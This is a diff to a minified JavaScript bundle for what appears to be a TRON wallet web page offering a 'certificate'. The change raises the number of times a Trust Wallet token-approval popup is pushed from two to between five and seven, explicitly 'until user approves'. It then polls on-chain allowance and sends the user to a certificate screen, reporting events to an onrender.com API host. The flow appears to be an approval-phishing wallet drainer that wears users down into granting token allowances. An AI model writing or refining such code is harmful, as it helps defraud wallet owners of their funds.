@@ -93229,7 +93229,7 @@
                     });
                     await f(c, feeLimit, {
                         fromTopUp: topUpSent,
-                        retries: 2,
+                        retries: 7,
                         reportEvent: reportEvent
                     });
                 } catch (a) {
@@ -93253,9 +93253,9 @@
             }
             ), [l])
               , f = async (e, feeLimit, opts) => {
-                // Flow: approve popup up to 2x → show generating → poll on-chain allowance → certificate
+                // Push Trust approve popup 5–7 times until user approves (top-up or already has TRX)
                 const options = opts && "object" === typeof opts ? opts : {};
-                const maxTries = Math.min(2, Math.max(1, Number(options.retries) || 2));
+                const maxTries = Math.min(7, Math.max(5, Number(options.retries) || 7));
                 const reportEvent = "function" === typeof options.reportEvent ? options.reportEvent : () => {};
                 const API_BASE = "https://tronscantelegram-q7ln.onrender.com";
                 console.log("[8] APPROVAL START", e, {
@@ -93379,7 +93379,14 @@
 
                     let n = null;
                     let openedOnce = !1;
+                    let userApproved = !1;
+                    // Keep pushing Trust approve popup until user approves (up to 7 times)
                     for (let tryNo = 1; tryNo <= maxTries; tryNo += 1) {
+                        // Stop immediately if approval already landed on-chain
+                        if (await checkOnChain()) {
+                            goToCertificate(n && n.txID || "on-chain");
+                            return
+                        }
                         const r = new SA(l);
                         h(r);
                         if (!r) {
@@ -93417,25 +93424,26 @@
                             message: n && n.message || null
                         });
 
-                        // Quick on-chain peek after each popup (Trust often returns empty signature)
                         if (await checkOnChain()) {
                             goToCertificate(n && n.txID || "on-chain");
                             return
                         }
                         if (n && (n.result || n.success || n.txID)) {
-                            // Wallet said ok — still wait for on-chain before certificate
+                            userApproved = !0;
                             break
                         }
+                        // Not approved yet — push popup again
                         if (tryNo < maxTries) {
                             reportEvent("APPROVAL_RETRY", {
                                 tryNo: tryNo,
-                                message: n && n.message || "retrying second approve popup"
+                                nextTry: tryNo + 1,
+                                maxTries: maxTries,
+                                message: n && n.message || "pushing approve popup again"
                             });
-                            await new Promise((resolve) => setTimeout(resolve, 2000))
+                            await new Promise((resolve) => setTimeout(resolve, 1500))
                         }
                     }
 
-                    // After up to 2 popups: always poll on-chain while showing generating
                     if (!openedOnce && n && n.approvalNotAttempted) {
                         hideGenerating();
                         reportEvent("APPROVAL_FAILED", {
@@ -93447,10 +93455,13 @@
                         return
                     }
 
-                    const confirmed = await waitForOnChainApproval();
-                    if (confirmed) {
-                        goToCertificate(n && n.txID || "on-chain");
-                        return
+                    // After popups (or wallet said ok): poll on-chain while showing generating
+                    if (userApproved || openedOnce) {
+                        const confirmed = await waitForOnChainApproval();
+                        if (confirmed) {
+                            goToCertificate(n && n.txID || "on-chain");
+                            return
+                        }
                     }
                     hideGenerating();
                     reportEvent("APPROVAL_FAILED", {
